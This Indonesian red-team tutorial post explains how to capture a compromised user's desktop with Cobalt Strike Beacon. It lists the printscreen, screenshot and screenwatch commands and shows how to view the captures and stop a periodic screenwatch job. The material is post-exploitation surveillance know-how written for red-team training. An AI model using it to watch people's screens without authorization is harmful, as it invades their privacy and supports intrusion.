---
title: '[Windows] Screenshots'
date: 2023-07-25 16:30:22 +0700
categories: ['Windows Hacking', 'Host Reconnaissance']
tags: [red team, host reconnaissance, windows hacking, cobalt strike, screenshot]     # TAG names should always be lowercase
author: nairpaa
---

Mengambil *screenshot* dari desktop pengguna dapat berguna untuk melihat apa yang mereka lakukan.

Hal ini dapat menunjukkan sistem atau aplikasi apa yang mereka gunakan, *shortcut* apa yang mereka miliki, dokumen apa yang sedang mereka kerjakan, dan sebagainya.

### 0x1 - Beacon

Beacon memiliki beberapa perintah untuk mengambil *screenshots* yang bekerja dengan cara yang sedikit berbeda.

```bash
beacon> printscreen   # Take a single screenshot via PrintScr method
beacon> screenshot    # Take a single screenshot
beacon> screenwatch   # Take periodic screenshots of desktop
```

Untuk melihat semua *screenshot* yang sudah diambil, buka **View > Screenshots**.

![Screenshot pada Cobalt Strike](/assets/img/posts/windows-screenshot/1.png){: w="650" h="550" }
_Screenshot pada Cobalt Strike_

Berikut contoh untuk mematikan proses `screenwatch`:

```bash
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 5    0     screenwatch


beacon> jobkill 5
```